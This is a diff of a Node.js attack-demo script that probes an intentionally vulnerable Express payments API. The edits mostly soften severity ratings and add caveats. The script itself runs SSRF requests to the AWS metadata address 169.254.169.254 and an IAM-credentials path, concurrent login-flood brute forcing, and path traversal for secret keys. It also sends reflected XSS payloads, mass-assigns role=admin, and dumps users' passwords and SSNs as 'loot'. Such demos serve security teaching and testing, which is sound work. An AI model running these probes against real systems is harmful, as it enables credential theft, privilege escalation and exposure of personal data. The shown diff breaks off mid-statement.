@@ -163,7 +163,7 @@ ${c.red}${c.bold}╔════════════════════
   console.log(`${c.bold}Target${c.reset}   ${c.cyan}${BASE}${c.reset}`);
   console.log(`${c.bold}Started${c.reset}  ${new Date().toISOString()}`);
   console.log(
-    `${c.bold}Claim${c.reset}   JWT is not a security model. Frameworks give you almost nothing — and nothing is not a security model.`
+    `${c.bold}Claim${c.reset}   JWT authenticates signed claims; authorization and safe application behavior still require explicit controls.`
   );
   console.log(
     `${c.bold}Flags${c.reset}    wire=${showWire ? "on" : "off"}  verbose=${verbose ? "on" : "off"}  drama=${drama ? "Enter" : "off"}  projector=${projector ? "on" : "off"}  flood=${skipFlood ? "off" : "on"}  slow=${skipSlow ? "off" : "on"}  reset=${doReset ? "on" : "off"}  gate=${gateToken ? "on" : "off"}  internal=${internalService || "none"}`
@@ -176,6 +176,7 @@ ${c.red}${c.bold}╔════════════════════
   console.log(
     `${c.dim}Legend   ${c.cyan}→ SEND${c.reset}${c.dim}  ${c.green}← RECV${c.reset}${c.dim}  ${c.bgRed}${c.white} LOOT ${c.reset}${c.dim}  ${c.red}✗ APP HOLE${c.reset}${c.dim}  ${c.yellow}◇ PLATFORM${c.reset}${c.dim}  ${c.green}✓ OK${c.reset}${c.dim}  kind: framework-gap | misconfig | app-code${c.reset}\n`
   );
+  console.log("  Ratings are demo-author judgments, not OWASP scores or CVSS. API tags use 2023; CWE tags identify specific weaknesses. Scoreboards count cumulative finding records, not unique root causes.");
 }
 
 /**
@@ -254,9 +255,10 @@ function finding(severity, title, meta = {}) {
     INFO: c.dim,
   };
   const color = colors[severity] || c.white;
-  const owasp = meta.owasp ? ` ${c.dim}[${meta.owasp}]${c.reset}` : "";
+  const owasp = meta.owasp ? ` ${c.dim}[${meta.owasp}:2023]${c.reset}` : "";
+  const cwe = meta.cwe ? ` ${c.dim}[${meta.cwe}]${c.reset}` : "";
   const kind = meta.kind ? ` ${c.dim}(${meta.kind})${c.reset}` : "";
-  console.log(`  ${color}${c.bold}[${severity}]${c.reset}${owasp}${kind} ${title}`);
+  console.log(`  ${color}${c.bold}[${severity}]${c.reset}${owasp}${cwe}${kind} ${title}`);
 }
 
 function scoreboard() {
@@ -269,7 +271,7 @@ function scoreboard() {
   const med = by.MEDIUM || 0;
   const infoN = by.INFO || 0;
   console.log(
-    `  ${c.dim}── scoreboard: ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
+    `  ${c.dim}── scoreboard (cumulative finding records): ${c.red}${crit} critical${c.dim} · ${c.yellow}${high} high${c.dim} · ${c.blue}${med} medium${c.dim} · ${infoN} info · loot users=${stolen.users.length} orders=${stolen.orders.length} secret=${stolen.jwtSecret ? "YES" : "no"}${c.reset}`
   );
 }
 
@@ -477,7 +479,7 @@ const stolen = {
  * @param {string} severity
  * @param {string} title
  * @param {string} [detail]
- * @param {{ kind?: "framework-gap"|"misconfig"|"app-code"|"platform", owasp?: string, source?: string }} [meta]
+ * @param {{ kind?: "framework-gap"|"misconfig"|"app-code"|"platform", owasp?: string, cwe?: string, source?: string }} [meta]
  *
  * kind:
  *   framework-gap — Express does not provide this control by default
@@ -492,6 +494,7 @@ function record(severity, title, detail, meta = {}) {
     detail,
     kind: meta.kind || "app-code",
     owasp: meta.owasp || null,
+    cwe: meta.cwe || null,
     source: meta.source || "app",
   };
   stolen.findings.push(entry);
@@ -530,7 +533,7 @@ function notePlatform(title, detail) {
 //   → phaseMissingSecurityHeaders
 //
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//   PHASE 04  ·  CORS misconfig — any Origin allowed (no login)
+//   PHASE 04  ·  CORS health-response policy (no login)
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //   → phaseCorsMisconfig
 //
@@ -540,7 +543,7 @@ function notePlatform(title, detail) {
 //   → phaseBodyLimit
 //
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
-//   PHASE 06  ·  Login flood — no rate limit (framework gap)
+//   PHASE 06  ·  Login flood — observed authentication throttling
 // ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
 //   → phaseNoRateLimitFlood  (--skip-flood)
 //
@@ -703,9 +706,9 @@ async function phaseMissingSecurityHeaders() {
     loot("missing-headers", missing.join(", "));
     // Edge may add HSTS (e.g. Vercel); remaining gaps are still app/framework posture.
     record(
-      "MEDIUM",
-      "No application secure-headers middleware",
-      "Bare Express does not set CSP/XFO/nosniff/HSTS on app routes (use Helmet or equivalent). Edge may add HSTS — that is not the app.",
+      "INFO",
+      "Security headers missing on health response",
+      "Response observation, not proof of missing middleware or exploitability. Header applicability depends on content, browser usage, TLS, and edge configuration.",
       { kind: "framework-gap", owasp: "API8" }
     );
   } else {
@@ -715,7 +718,7 @@ async function phaseMissingSecurityHeaders() {
 
 /**
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 04  ·  CORS misconfig — any Origin allowed (no login)
+ *   PHASE 04  ·  CORS health-response policy (no login)
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  * Function: phaseCorsMisconfig
  * Endpoint: GET /api/health with Origin: https://evil-attacker.example
@@ -724,9 +727,9 @@ async function phaseMissingSecurityHeaders() {
  * Finding kind is misconfig, not framework-gap.
  */
 async function phaseCorsMisconfig() {
-  step("CORS misconfig — any Origin allowed (no login)");
+  step("CORS health-response policy (no login)");
   intent(
-    "Browser cross-origin: if Access-Control-Allow-Origin is * (or echoes any Origin), any website can call this API. Bare Express has no CORS; this app added cors({ origin: '*' })."
+    "CORS controls browser response access, not API authorization. This demo added wildcard CORS; the probe checks only the health response, not victim-session access."
   );
   const evilOrigin = "https://evil-attacker.example";
   narrate(`GET /api/health with Origin: ${evilOrigin}…`);
@@ -741,11 +744,11 @@ async function phaseCorsMisconfig() {
     loot("ACA-Origin", acao);
     if (acac) loot("ACA-Credentials", acac);
     record(
-      "HIGH",
-      "CORS misconfig allows any browser origin",
+      "INFO",
+      "Health response permits cross-origin reads",
       acao === "*"
-        ? "cors package with origin: '*' — not an Express default (bare Express has no CORS). Any site can read API responses from a victim browser session if cookies/auth apply."
-        : `Reflects Origin ${evilOrigin} — effectively open CORS for any site that sends Origin.`,
+        ? "Wildcard CORS permits non-credentialed browser reads. It does not permit credentials: include response access or reveal a victim's bearer token. Public health data alone does not prove harmful misconfiguration."
+        : `Allows the tested origin ${evilOrigin}. One origin is not proof of unrestricted reflection; credentialed access and sensitive-data impact are untested.`,
       { kind: "misconfig", owasp: "API8" }
     );
   } else if (!acao) {
@@ -780,42 +783,38 @@ async function phaseBodyLimit() {
     });
     if (res.status === 413) {
       ok(`Server rejected oversized body with 413 (${res.ms}ms)`);
-    } else if (res.status === 401 || res.status === 400) {
+    } else if (res.status === 401 && res.json?.error === "No account for that email") {
       bad(
         `Accepted ~1.5 MiB JSON → HTTP ${res.status} in ${res.ms}ms (demo raised the limit; Express default is 100kb)`
       );
       record(
         "HIGH",
-        "Demo misconfig: custom parser allows ~50mb bodies",
-        "Not an Express default. body-parser/express.json limit defaults to '100kb' (413 entity.too.large). Demo replaced that with an explicit ~50mb parser (Workers + attack).",
+        "Login accepts approximately 1.5 MiB JSON body",
+        "Observed login-handler rejection after parsing the oversized payload. Demo source defaults BODY_LIMIT to 50mb; this probe does not measure the maximum limit or demonstrate DoS. Express express.json() defaults to 100kb.",
         { kind: "misconfig", owasp: "API4" }
       );
     } else {
-      bad(`Unexpected status ${res.status} for large body (${res.ms}ms)`);
-      record("MEDIUM", `Large body produced status ${res.status}`, "Check body middleware", {
-        kind: "misconfig",
-      });
+      info(`Large-body result inconclusive: status=${res.status}, elapsed=${res.ms}ms; handler-level parsing not confirmed`);
     }
   } catch (err) {
     info(`Large body probe error: ${err.message}`);
-    record("INFO", "Large body probe did not complete", err.message, { kind: "misconfig" });
   }
 }
 
 /**
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
- *   PHASE 06  ·  Login flood — no rate limit (framework gap)
+ *   PHASE 06  ·  Login flood — observed authentication throttling
  * ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
  * Function: phaseNoRateLimitFlood
  * Endpoint: 40× parallel POST /api/auth/login (wrong passwords; wire logs collapsed)
  * Skip:     --skip-flood (banner still prints; body short-circuits)
  *
- * Proves Express has no built-in auth throttle — zero 429s expected on this demo.
+ * Observes one bounded batch; it does not measure every possible throttle window.
  */
 async function phaseNoRateLimitFlood() {
-  step("Login flood — no rate limit (framework gap)");
+  step("Login flood — observed authentication throttling");
   intent(
-    "Express core has no login rate limiter (security guide recommends external packages e.g. rate-limiter-flexible). Credential stuffing is free until you add one."
+    "Express core has no login rate limiter. This bounded batch checks wrong-password attempts on one account; it cannot rule out other throttle thresholds or time windows."
   );
   if (skipFlood) {
     info("Skipped (--skip-flood)");
@@ -828,7 +827,7 @@ async function phaseNoRateLimitFlood() {
   const results = await Promise.all(
     Array.from({ length: N }, (_, i) =>
       http("POST", "/api/auth/login", {
-        body: { email: `flood${i}@evil.test`, password: "wrong-password" },
+        body: { email: "alice@example.com", password: "wrong-password" },
         timeoutMs: 20_000,
         silent: true,
         label: `flood-${i}`,
@@ -842,7 +841,7 @@ async function phaseNoRateLimitFlood() {
     return m;
   }, {});
   const got429 = statuses.filter((s) => s === 429).length;
-  const got401 = statuses.filter((s) => s === 401).length;
+  const got401 = results.filter((result) => result.status === 401 && result.json?.error === "Incorrect password").length;
   const idAfter = reqSeq;
 
   console.log(
@@ -853,20 +852,17 @@ async function phaseNoRateLimitFlood() {
   );
 
   if (got429 === 0 && got401 >= N * 0.7) {
-    bad(`${N} failures accepted with zero 429 responses`);
+    bad(`${got401}/${N} attempts returned the normal wrong-password error; zero 429 responses`);
     record(
       "HIGH",
-      "No rate limiting on authentication",
-      `${N} concurrent failures, zero 429 — no built-in auth throttle in Express; must add middleware`,
-      { kind: "framework-gap", owasp: "API4" }
+      "No authentication throttling observed in this batch",
+      `${got401}/${N} concurrent attempts returned Incorrect password, zero 429. Does not prove absence of all lockouts, delays, or longer-window limits. Resource-abuse risks also relate to API4.`,
+      { kind: "framework-gap", owasp: "API2", cwe: "CWE-307" }
     );
   } else if (got429 > 0) {
     ok(`Server rate-limited some requests (${got429} × 429)`);
   } else {
-    record("MEDIUM", "Flood produced mixed failures", JSON.stringify(counted), {
-      kind: "framework-gap",
-      owasp: "API4",
-    });
+    info(`Authentication throttle probe inconclusive: ${JSON.stringify(counted)}`);
   }
 }
 
@@ -918,9 +914,9 @@ async function phasePathTraversal() {
     }
     record(
       "CRITICAL",
-      "Path traversal reads server secret files",
-      "App vfs/join with no containment — Express did not invent this endpoint",
-      { kind: "app-code", owasp: "API1" }
+      "Path traversal exposes virtual secret-file contents",
+      "Demo in-memory VFS joins input without containment; no disk files were read. The hard-coded backup key may differ from the active signing key; JWT acceptance is tested separately.",
+      { kind: "app-code", cwe: "CWE-22" }
     );
   } else {
     ok("Path traversal did not yield secrets (unexpected for this demo)");
@@ -952,7 +948,7 @@ async function phaseOpenRedirect() {
       "HIGH",
       "Open redirect",
       "Any absolute URL accepted — app-code; res.redirect(url) does not validate destinations (Express security guide: prevent open redirects)",
-      { kind: "app-code", owasp: "API8" }
+      { kind: "app-code", cwe: "CWE-601" }
     );
   } else {
     ok(`Redirect not open (status ${res.status}, location=${loc || "none"})`);
@@ -970,8 +966,7 @@ const AWS_IMDS_URL = "http://169.254.169.254/latest/meta-data/";
  * Called from {@link phaseSsrfProxy}. Wire: ssrf-imds
  * Endpoint: GET /api/proxy?url=http://169.254.169.254/latest/meta-data/
  *
- * Probe unrestricted egress / cloud-metadata class. Honest: CF/Vercel often
- * lack IMDS; finding is still "no egress policy" when the open proxy exists.
+ * Probe cloud-metadata-style egress; failed or unrecognized responses are inconclusive.
  * @param {{ proxyAlive: boolean }} opts - false when /api/proxy is missing
  */
 async function probeMetadataEgress(opts = { proxyAlive: true }) {
@@ -990,16 +985,7 @@ async function probeMetadataEgress(opts = { proxyAlive: true }) {
     });
   } catch (err) {
     info(`IMDS probe transport error: ${err.message}`);
-    record(
-      "HIGH",
-      "Open proxy accepted cloud-metadata URL (egress unrestricted)",
-      "App attempted server-side fetch of 169.254.169.254 via /api/proxy. No link-local/private allowlist. Transport failed off-box — class still applies on EC2/IMDSv1.",
-      { kind: "app-code", owasp: "API7" }
-    );
-    notePlatform(
-      "Cloud-metadata probe did not return IMDS data (expected off EC2)",
-      "Link-local egress often fails on Workers/Vercel. Same open proxy still fetches other URLs."
-    );
+    info("Metadata reachability and the reason for failure are unconfirmed; no metadata finding recorded.");
     return;
   }
 
@@ -1018,42 +1004,26 @@ async function probeMetadataEgress(opts = { proxyAlive: true }) {
       /^(ami-|i-)[a-z0-9-]+/i.test(body));
 
   if (looksLikeImds) {
-    bad("Open proxy reached link-local metadata endpoint — credential theft class");
+    bad("Metadata-shaped response returned for link-local URL");
     loot("imds-snippet", body.slice(0, 160));
     record(
-      "CRITICAL",
-      "SSRF open proxy can reach cloud instance metadata",
-      "Server fetched 169.254.169.254 (IMDS). On EC2/IMDSv1 this class yields instance role credentials. No egress allowlist on /api/proxy.",
+      "HIGH",
+      "SSRF returns metadata-shaped content from link-local URL",
+      "Response resembles metadata; this probe does not authenticate its source or retrieve usable IAM credentials. EC2 credential exposure depends on IMDS configuration and an attached role.",
       { kind: "app-code", owasp: "API7" }
     );
     return;
   }
 
   if (meta.status === 200 && body.length > 20 && !proxyReportedFail) {
-    bad(`Metadata URL returned HTTP 200 (${body.length} B) — may not be real IMDS; egress still open`);
+    info(`Metadata URL returned HTTP 200 (${body.length} B); upstream identity unconfirmed`);
     loot("imds-body", body.slice(0, 120));
-    record(
-      "HIGH",
-      "Open proxy accepted cloud-metadata URL (egress unrestricted)",
-      "GET /api/proxy?url=http://169.254.169.254/... was allowed through the app. Response may not be real IMDS on serverless — the bug is unrestricted server-side fetch.",
-      { kind: "app-code", owasp: "API7" }
-    );
+    info("No metadata-specific vulnerability recorded from an unrecognized response.");
     return;
   }
 
-  // Proxy accepted the request path; upstream failed or empty — still "no allowlist" on vulnerable apps.
   info(
-    `IMDS probe → status=${meta.status} (often fail on Workers/Vercel — not EC2). Class: open proxy has no private/link-local block.`
-  );
-  record(
-    "HIGH",
-    "Open proxy has no egress allowlist (metadata-class URL not blocked at app)",
-    "Requested classic AWS IMDS URL via /api/proxy. App did not refuse link-local/private ranges; runtime/upstream failed or has no IMDS. On a misconfigured VM the same hole reaches 169.254.169.254.",
-    { kind: "app-code", owasp: "API7" }
-  );
-  notePlatform(
-    "Cloud-metadata probe did not return IMDS data (expected off EC2)",
-    "Platform/runtime may refuse link-local egress. App still exposes unrestricted /api/proxy for other URLs."
+    `IMDS probe → status=${meta.status}; metadata reachability not demonstrated. Source inspection shows no app URL allowlist, but this response does not establish platform egress policy.`
   );
 }
 
@@ -1071,8 +1041,8 @@ async function probeMetadataEgress(opts = { proxyAlive: true }) {
  *
  * Two probes:
  *  1. direct — proxy fetches the internal IAM-shaped URL
- *  2. hop    — proxy fetches a public-looking URL that 302s internal
- *              (`redirect: "follow"`); first-URL allowlists lose here
+ *  2. hop    — proxy follows a redirect within the same stand-in service
+ *              (`redirect: "follow"`); no allowlist bypass is established
  *
  * @param {{ proxyAlive: boolean }} opts
  */
@@ -1086,10 +1056,10 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
   const credsPath = "/latest/meta-data/iam/security-credentials/vaultpay-demo-role";
   const internalUrl = `${internalService}${credsPath}`;
 
-  narrate(`Reachability check: can WE hit ${internalService} directly?`);
+  narrate(`Reachability check: can WE fetch the same stand-in resource directly?`);
   let attackerReach = false;
   try {
-    const direct = await fetch(`${internalService}/health`, {
+    const direct = await fetch(internalUrl, {
       signal: AbortSignal.timeout(2500),
     });
     attackerReach = direct.ok;
@@ -1101,9 +1071,9 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
     // unroutability. Say what is and isn't being modelled — the mechanic below
     // (server fetches a URL you chose, hands you the body) is the real part.
     info("Laptop run: attacker and API share a host, so this service is reachable from here too");
-    info("On a real deployment it sits on a private subnet — unroutable from your seat, one hop from the server");
+    info("This run does not demonstrate a private-network boundary; the credentials are fabricated demo data");
   } else {
-    ok("Attacker cannot reach the internal service directly — only the server can");
+    info("Direct client fetch failed; this alone does not prove the service is internal-only");
   }
 
   narrate(`Asking the SERVER to fetch it instead: ${internalUrl}`);
@@ -1113,19 +1083,19 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
   });
   const body = (pivot.text || "").replace(/\s+/g, " ").trim();
   if (pivot.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(body)) {
-    bad("Server fetched an internal-only service and handed us the response");
+    bad("Server fetched the separate metadata stand-in and returned fabricated credentials");
     loot("internal-creds", body.slice(0, 180));
     record(
-      "CRITICAL",
-      "SSRF pivot to internal-only service",
-      "Server-side fetch has no egress policy: it reaches a service the client cannot, and returns the body verbatim (stand-in for cloud IMDS)",
+      "HIGH",
+      "SSRF fetches metadata stand-in credentials",
+      `Fabricated credentials from the separate demo service, not real IAM credentials. Direct client fetch ${attackerReach ? "also succeeded; no private-network boundary demonstrated" : "failed; network isolation remains unconfirmed"}.`,
       { kind: "app-code", owasp: "API7" }
     );
   } else {
     info(`Internal pivot → ${pivot.status} ${body.slice(0, 80)}`);
   }
 
-  narrate("Now the bypass: a public-looking URL that 302s to the internal one…");
+  narrate("Now test redirect following within the same stand-in service (not an allowlist bypass)…");
   const hopUrl = `${internalService}/redirect?to=${encodeURIComponent(credsPath)}`;
   const hop = await http("GET", `/api/proxy?url=${encodeURIComponent(hopUrl)}`, {
     timeoutMs: 8_000,
@@ -1133,14 +1103,9 @@ async function probeInternalPivot(opts = { proxyAlive: true }) {
   });
   const hopBody = (hop.text || "").replace(/\s+/g, " ").trim();
   if (hop.status === 200 && /AccessKeyId|SecretAccessKey|Token/i.test(hopBody)) {
-    bad("Redirect hop landed on the internal service — first-URL allowlists lose here");
+    bad("Proxy followed the stand-in redirect and returned fabricated credentials");
     loot("hop-creds", hopBody.slice(0, 140));
-    record(
-      "HIGH",
-      "SSRF redirect-hop bypass (redirect: follow, no per-hop revalidation)",
-      "Checking only the URL the user supplied is not enough — fetch follows 3xx and the final hop is never revalidated",
-      { kind: "app-code", owasp: "API7" }
-    );
+    info("Additional evidence for the same proxy flaw; no new finding or allowlist bypass counted. Production SSRF defenses must validate every destination or disable redirects.");
   } else {
     info(`Redirect-hop probe → ${hop.status}`);
   }
@@ -1186,8 +1151,8 @@ async function phaseSsrfProxy() {
     }
     record(
       "CRITICAL",
-      "SSRF open proxy can reach internal URLs",
-      "fetch(user URL) with no allowlist — Express has no built-in SSRF guard",
+      "SSRF proxy returns its public debug endpoint's secret",
+      "Observed server-side self-fetch of the public BASE URL. This proves proxying the secret response, not access to an internal-only network destination.",
       { kind: "app-code", owasp: "API7" }
     );
   } else if (res.status === 200) {
@@ -1274,8 +1239,8 @@ async function phaseStackAndEcho() {
     loot("stack-top", String(boom.json.stack).split("\n")[0]);
     record(
       "MEDIUM",
-      "Misconfig: custom error handler leaks stack in production",
-      "Default finalhandler (Express error path) only includes err.stack when env !== 'production'. This app's /api/boom + custom handler always send stack JSON.",
+      "Custom handler exposes stack trace",
+      "Observed stack JSON; deployment mode is not established by this probe. Demo source always includes stacks, unlike Express finalhandler when NODE_ENV=production.",
       { kind: "misconfig", owasp: "API8" }
     );
   } else {
@@ -1298,8 +1263,8 @@ async function phaseStackAndEcho() {
     record(
       "HIGH",
       "App code: reflected HTML echo sink (XSS class)",
-      "Not a framework default — developer built text/html echo of query params",
-      { kind: "app-code", owasp: "API8" }
+      "Unescaped HTML reflected in an HTML response. This mild payload proves HTML injection; browser JavaScript execution and CSP effectiveness were not tested.",
+      { kind: "app-code", cwe: "CWE-79" }
     );
   } else {
     const xss = `<img src=x onerror=alert(1)>`;
@@ -1318,7 +1283,7 @@ async function phaseStackAndEcho() {
         "HIGH",
         "App code: reflected XSS via HTML echo endpoint",
         "Developer built this sink — Express does not echo HTML by default",
-        { kind: "app-code", owasp: "API8" }
+        { kind: "app-code", cwe: "CWE-79" }
       );
     } else if (echo.status === 403 || mildRes.status === 403) {
       notePlatform(
@@ -1339,13 +1304,13 @@ async function phaseStackAndEcho() {
  * Endpoint: GET /api/slow?ms=3000  (wire: slow-handler)
  * Skip:     --skip-slow (banner still prints; body short-circuits)
  *
- * Framework gap: Express has no per-request timeout middleware; 3s hang proves
- * no tight app-level budget (Node default requestTimeout is 5 min).
+ * Observes a client-selected 3s delay, not the absence of every execution deadline.
+ * Node requestTimeout limits request reception, not handler execution.
  */
 async function phaseSlowTimeout() {
   step("Slow handler holds the connection (no login)");
   intent(
-    "Express has no request-timeout middleware. Node's http.Server requestTimeout defaults to 300000ms (5 min) since Node 18 — we do not zero it. A 3s hang still proves no tight app-level budget."
+    "This probe measures a 3s handler response. Node requestTimeout limits receiving the request, not handler execution. A successful response cannot rule out longer execution deadlines."
   );
   if (skipSlow) {
     info("Skipped (--skip-slow)");
@@ -1357,11 +1322,11 @@ async function phaseSlowTimeout() {
     label: "slow-handler",
   });
   if (res.status === 200 && res.ms >= 2500) {
-    bad(`Handler held the connection for ${res.ms}ms with no app-level timeout`);
+    bad(`Handler held the connection for ${res.ms}ms; no shorter execution deadline observed`);
     record(
       "MEDIUM",
-      "No application request-timeout budget",
-      "Express core has no per-request timeout middleware. Node http.Server requestTimeout default is 300s (not a 3s app budget). App left /api/slow open (caps at 120s only).",
+      "Client-selected delay holds a request for approximately 3 seconds",
+      "Observed delay on a public demo handler. Source caps delay at 120s; this probe does not establish no timeouts or demonstrate resource exhaustion. Execution budgets depend on endpoint requirements.",
       { kind: "framework-gap", owasp: "API4" }
     );
   } else if (res.status === 400 || res.status === 404) {
@@ -1403,7 +1368,7 @@ async function phaseUnauthDataTheft() {
       "CRITICAL",
       "Unauthenticated user dump",
       "No auth middleware on collection route — app left it public",
-      { kind: "app-code", owasp: "API1" }
+      { kind: "app-code", owasp: "API5" }
     );
   } else {
     ok(`GET /api/users → ${usersRes.status}`);
@@ -1451,7 +1416,7 @@ async function phaseUnauthDataTheft() {
     record(
       "HIGH",
       "Unauthenticated PII search",
-      "Substring match on address/SSN/email with no auth",
+      "Search exposes sensitive object properties without filtering (API3), and lacks function access control (also API5).",
       { kind: "app-code", owasp: "API3" }
     );
   }
@@ -1485,7 +1450,8 @@ async function phaseAccountEnumeration() {
   const e2 = wrong.json?.error || wrong.text;
   loot("missing-user-error", e1);
   loot("wrong-password-error", e2);
-  if (e1 && e2 && e1 !== e2) {
+  if (missing.status === 401 && wrong.status === 401 &&
+    e1 === "No account for that email" && e2 === "Incorrect password") {
     bad("Error strings differ — accounts are enumerable");
     record(
       "MEDIUM",
@@ -1494,7 +1460,7 @@ async function phaseAccountEnumeration() {
       { kind: "app-code", owasp: "API2" }
     );
   } else {
-    ok("Login errors are uniform");
+    info(e1 === e2 ? "No login-message discrepancy observed" : "Unexpected login responses; enumeration not confirmed");
   }
 }
 
@@ -1526,15 +1492,15 @@ async function phaseSettingsMerge() {
     loot("settings", JSON.stringify(put.json.settings));
     record(
       "HIGH",
-      "Unauthenticated settings write with mass assignment",
-      "State-changing PUT with no auth and no field allowlist — app-code",
-      { kind: "app-code", owasp: "API3" }
+      "Unauthenticated settings write accepts arbitrary properties",
+      "Observed unauthorized global-settings mutation (API5). Arbitrary properties were accepted; privileged-property impact (API3) is not demonstrated by the injected flag.",
+      { kind: "app-code", owasp: "API5", cwe: "CWE-915" }
     );
   } else {
     info(`settings probe → ${put.status}`);
   }
   if (before.json?.settings) {
-    narrate("Restoring previous settings for a clean re-run…");
+    narrate("Reapplying previous settings; merge does not remove newly added keys…");
     await http("PUT", "/api/settings", {
       body: before.json.settings,
       label: "settings-restore",
@@ -1572,9 +1538,9 @@ async function phaseRawHeaderAbuse() {
     if (r1.status === 200) {
       bad("Oversized header still got HTTP 200");
       record(
-        "MEDIUM",
-        "Oversized request headers accepted",
-        "No max header size rejection observed — posture note",
+        "INFO",
+        "32 KB request header accepted",
+        "Observed acceptance at one size, not absence of a larger limit or proof of resource exhaustion. Header parsing limits belong to the HTTP runtime/proxy.",
         { kind: "framework-gap", owasp: "API4" }
       );
     } else {
@@ -1673,7 +1639,7 @@ async function phaseAuthzAndForgery() {
     const others = new Set(
       stolen.orders.map((o) => o.userId).filter((id) => id !== loginOk.user.id)
     );
-    if (others.size > 0) {
+    if (others.size > 0 && loginOk.user.role !== "admin") {
       bad(`Got ${stolen.orders.length} orders spanning ${1 + others.size} users (BOLA)`);
       for (const o of stolen.orders.slice(0, 8)) {
         loot(`Order #${o.id}`, `userId=${o.userId} ${o.merchant} $${o.amount} ····${o.cardLast4}`);
@@ -1684,6 +1650,8 @@ async function phaseAuthzAndForgery() {
         "Authn present, authz missing — any login reads every order",
         { kind: "app-code", owasp: "API1" }
       );
+    } else if (loginOk.user.role === "admin") {
+      info("Admin fallback cannot establish unauthorized cross-user order access; no BOLA finding counted");
     } else {
       ok(`Orders scoped to self (${stolen.orders.length} order(s) for user #${loginOk.user.id})`);
     }
@@ -1694,69 +1662,75 @@ async function phaseAuthzAndForgery() {
   const escToken = stolen.token;
   const escId = loginOk.user.id;
 
-  narrate(
-    `Mass-assign role=admin on seed user #${escId} (${loginOk.email}) — works even on multi-instance serverless…`
-  );
-  const escalate = await http("PUT", `/api/users/${escId}`, {
-    headers: { Authorization: `Bearer ${escToken}` },
-    body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
-    label: "mass-assign-admin",
-  });
-  if (escalate.status === 200 && escalate.json?.user?.role === "admin") {
-    stolen.escalated = true;
-    bad(`User #${escId} is now admin with balance=${escalate.json.user.balance}`);
-    loot("new-role", escalate.json.user.role);
-    loot("new-balance", String(escalate.json.user.balance));
-    record(
-      "CRITICAL",
-      "Mass assignment privilege escalation",
-      "No field allowlist on PUT body — app merged raw JSON into the user",
-      { kind: "app-code", owasp: "API3" }
-    );
+  if (loginOk.user.role !== "admin") {
+    narrate("Hit /api/admin/stats before escalation with a non-admin identity...");
+    const stats = await http("GET", "/api/admin/stats", {
+      headers: { Authorization: `Bearer ${escToken}` },
+      label: "admin-stats",
+    });
+    if (stats.status === 200 && Array.isArray(stats.json?.accounts) && stats.json.accounts.length > 0) {
+      bad(`Admin dashboard open to a non-admin identity - ${stats.json.accounts.length} accounts`);
+      for (const account of stats.json.accounts.slice(0, 6)) {
+        loot(account.email, `password=${account.password} ssn=${account.ssn}`);
+      }
+      record(
+        "CRITICAL",
+        "Admin route accessible to a non-admin identity",
+        "Observed before role mutation: a regular user's token accesses the administrative account dump (BFLA).",
+        { kind: "app-code", owasp: "API5" }
+      );
+    } else {
+      info(`Non-admin access probe returned ${stats.status}; BFLA not confirmed`);
+    }
   } else {
-    info(`Mass assignment → ${escalate.status}`);
+    info("Login fallback is already admin; skip non-admin BFLA and privilege-escalation claims");
   }
 
-  // Bob is always seed id 2 on every cold start.
-  const victimId = 2;
-  narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (Bob)…`);
+  const victimId = escId === 2 ? 1 : 2;
+  const victimName = victimId === 2 ? "Bob" : "Alice";
+  narrate(`Cross-user write: ${loginOk.email}'s token edits seed user #${victimId} (${victimName})…`);
   const hijack = await http("PUT", `/api/users/${victimId}`, {
     headers: { Authorization: `Bearer ${escToken}` },
     body: {
       internalNote: "cleared by attacker via cross-user PUT",
-      name: "Hijacked Bob",
+      name: `Hijacked ${victimName}`,
     },
     label: "cross-user-write",
   });
-  if (hijack.status === 200 && /Hijacked|cleared by attacker/i.test(JSON.stringify(hijack.json?.user || {}))) {
+  if (loginOk.user.role !== "admin" && hijack.status === 200 &&
+    hijack.json?.user?.id === victimId && hijack.json.user.name === `Hijacked ${victimName}`) {
     bad(`Rewrote user #${victimId} without ownership check`);
     loot("victim", JSON.stringify(hijack.json.user));
     record(
       "CRITICAL",
       "Cross-user write without ownership check",
-      "Any authenticated client can edit any user id",
+      "Before escalation, a regular user's token edited a different seed user's record without an ownership check.",
       { kind: "app-code", owasp: "API1" }
     );
   } else {
     info(`Cross-user write → ${hijack.status}`);
   }
 
-  narrate("Hit /api/admin/stats with a non-admin-issued JWT…");
-  const stats = await http("GET", "/api/admin/stats", {
+  narrate(`Mass-assign role=admin and balance on seed user #${escId} (${loginOk.email})...`);
+  const escalate = await http("PUT", `/api/users/${escId}`, {
     headers: { Authorization: `Bearer ${escToken}` },
-    label: "admin-stats",
+    body: { role: "admin", balance: 1_000_000, internalNote: "pwned by attack.mjs" },
+    label: "mass-assign-admin",
   });
-  if (stats.status === 200 && stats.json?.accounts) {
-    bad(`Admin dashboard open — ${stats.json.accounts.length} accounts with passwords`);
-    for (const a of stats.json.accounts.slice(0, 6)) {
-      loot(a.email, `password=${a.password} ssn=${a.ssn}`);
-    }
+  if (loginOk.user.role !== "admin" && escalate.status === 200 && escalate.json?.user?.id === escId &&
